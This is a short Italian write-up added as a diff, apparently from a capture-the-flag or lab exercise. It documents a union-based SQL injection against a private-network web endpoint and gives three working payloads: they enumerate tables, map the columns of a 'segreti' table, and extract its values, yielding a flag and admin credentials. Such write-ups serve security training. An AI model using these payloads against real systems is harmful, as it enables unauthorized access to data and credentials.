@@ -1,0 +1,22 @@
+Target: http://10.8.0.27:32001/check?q= Vulnerabilità: SQL Injection (Union-Based)
+
+1. Identificazione e Mappatura
+L'applicazione rifletteva i risultati di una query SQL nel campo q. Ho utilizzato l'operatore UNION per forzare il database a restituire i nomi delle tabelle presenti.
+
+Payload: -1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#
+
+Risultato: Individuata la tabella sensibile segreti.
+
+2. Analisi della Struttura (Discovery)
+Identificata la tabella, è stato necessario mapparne le colonne per individuare dove fossero salvati i dati d'interesse.
+
+Payload: -1 UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name='segreti'#
+
+Risultato: Individuate le colonne id, titolo e valore.
+
+3. Esfiltrazione Finale
+Ottenuta la struttura completa, ho eseguito la query finale per estrarre il contenuto della colonna target dalla tabella individuata.
+
+Payload: -1 UNION SELECT id, valore FROM segreti#
+
+Esito: Recupero della Flag e delle credenziali amministrative.
